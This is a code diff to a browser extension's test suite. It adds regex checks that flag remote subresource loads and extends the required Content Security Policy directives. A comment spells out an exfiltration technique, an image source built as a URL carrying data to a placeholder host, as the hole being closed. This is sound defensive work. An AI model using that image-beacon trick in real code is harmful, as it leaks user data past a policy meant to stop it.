@@ -53,6 +53,13 @@ export const BANNED = [
   // configuration to Google, which is a network path this extension otherwise
   // does not have, so settings may be stored, but never synced.
   ['synced storage', /chrome\.storage\.sync/],
+  // The CSP is the wall; these two are the tripwire. A remote subresource is the
+  // one network path `connect-src 'none'` never covered, and the directives that
+  // close it are easy to drop in an edit that looks harmless. Catching the
+  // assignment as well as the policy means a mistake fails the suite rather than
+  // waiting for someone to re-read the manifest.
+  ['remote subresource: src assignment', /\.(?:src|srcset)\s*=\s*['"`][^'"`]*https?:\/\//],
+  ['remote subresource: CSS url()', /url\(\s*['"]?https?:\/\//],
 ];
 
 /**
@@ -180,10 +187,25 @@ const FORBIDDEN_MANIFEST_KEYS = [
 
 // Anything broader than this may not even be offered.
 const ALLOWED_OPTIONAL_HOSTS = ['<all_urls>'];
+// `connect-src 'none'` stops fetch, XHR, WebSocket and beacons. It does nothing
+// about a subresource: an absent directive with no `default-src` to fall back on
+// is unrestricted, so a policy that names only the three above leaves `img-src`,
+// `style-src`, `font-src` and `media-src` wide open, and
+// `new Image().src = 'https://host/?d=' + data` is a network path out. Every
+// directive is listed rather than leaning on one `default-src`, because a reader
+// checking the claim should be able to see each answer instead of deriving it.
+// See DECISIONS.md D15.
 const REQUIRED_CSP_DIRECTIVES = [
   "script-src 'self'",
   "object-src 'none'",
   "connect-src 'none'",
+  "frame-src 'none'",
+  "img-src 'self' data: blob:",
+  "style-src 'self' 'unsafe-inline'",
+  "font-src 'self'",
+  "media-src 'none'",
+  "base-uri 'none'",
+  "form-action 'none'",
 ];
 
 /** @returns {string[]} human-readable failures; empty means the manifest is clean. */
